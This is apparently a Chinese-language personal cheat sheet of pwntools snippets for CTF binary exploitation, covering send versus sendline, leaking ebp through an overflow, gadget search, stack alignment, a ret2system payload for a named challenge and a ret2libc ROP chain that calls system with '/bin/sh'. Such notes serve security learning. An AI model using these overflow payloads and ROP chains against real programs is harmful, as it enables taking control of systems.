## 关闭 BytesWarning

```python
import warnings
warnings.filterwarnings("ignore", category=BytesWarning)
```

## 各函数的细节区别 scanf 用 sendline, read 用 send

| 函数名 | pwn 工具 | 输出的区别     |
| ------ | -------- | -------------- |
| scanf  | sendline |                |
| read   | send     |                |
| puts   |          | 发送后追加`\n` |
| printf |          | 不追加`\n`     |

## 溢出读取 ebp 值

sendline 发送时\n 会占一个字符 0x4 大小发 `sendline 'a'*4` 会发 5 个字符引发问题。

举例

```c
char s[40]; // [ebp-28h]
read(0, s, 0x30u);


// 要输出 ebp 需要 0x20 个字节这时只要覆盖最后的 00 即可输出 ebp，read时用send,不用sendline
// 如果是scanf要用 sendline
payload1 = b'A' * (0x27) + b'B'
p.send(payload1)  # not sendline
p.recvuntil("B")
original_ebp = u32(p.recv(4))
```

### 填充指定大小

```py
'a'.ljust(268, ' ')
```

## 使用默认的 libc

```
elf = ELF("./canary")
libc = elf.libc
```

## find leave asm

```python
leave_ret = elf.search(asm('leave')).__next__()

pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = ROP(elf).find_gadget(['pop rsi'])[0]
leave_ret = ROP(elf).find_gadget(['leave', 'ret'])[0]
print(hex(pop_rdi))
```

## snippets

```python
ss = lambda data: s.send(str(data))
sa = lambda delim, data: s.sendafter(str(delim), str(data))
sl = lambda data: s.sendline(data)
sls = lambda data: s.sendline(str(data))
sla = lambda delim, data: s.sendlineafter(str(delim), str(data))
r = lambda num: s.recv(num)
ru = lambda delims, drop=True: s.recvuntil(delims, drop)
itr = lambda: s.interactive()
uu32 = lambda data: u32(data.ljust(4, b'\x00'))
uu64 = lambda data: u64(data.ljust(8, b'\x00'))
leak = lambda name, addr: log.success('{} = {:#x}'.format(name, addr))
l64 = lambda: u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
l32 = lambda: u32(p.recvuntil("\xf7")[-4:].ljust(4, b"\x00"))

bss_addr = elf.bss()
```

# Stack

## 栈对齐

```python
rop = ROP(elf)
rop.raw(b'a' * (64 + 8)) # 填充 64 + fake_rbp(8) 个字节的数据到缓冲区中
rop.raw(flat(ret)) # 方式1. 加个ret即可
rop.call(system, [bin_sh]) # 栈对齐

# 方式2 不加ret 加参数 rop.call(system, [bin_sh, '0']) # 栈对齐
```

## ret2system

```sh
# ciscn_2019_es_2
elf.plt['system'] + p32(0) + binsh_addr  # 是地址不是 "/bin/sh" 字符
payload =p32(0) + p32(elf.plt['system']) + p32(0) + p32(stdin_addr+0x10) + b'/bin/sh\x00'
payload = payload.ljust(0x28, '\x00')
```

# rop

见 pwn_01_stack_03_ret2libc_x64_00_ctfhub_bypwntool_rop.py

```sh
rop = ROP('./ret2libc') # x64
rop.raw(b'A' * (144 + 8))  # 填充144 + fake_rbp(8) 个字节的数据到缓冲区中
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
# rop.call 会自动 pop rdi, ret来传入参数
rop.call(puts_plt, [puts_got]) # puts_plt(puts_got, arg2, arg3, arg4, ...)
rop.call('main')  # 自动构建下一步的ret调用main函数，使程序重新运行
p.sendline(rop.chain())

# 再发送时要重新构建 rop
rop = ROP('./ret2libc')
rop.raw(b'A' * (144 + 8))
rop.call(system_addr, [binsh_addr])
```
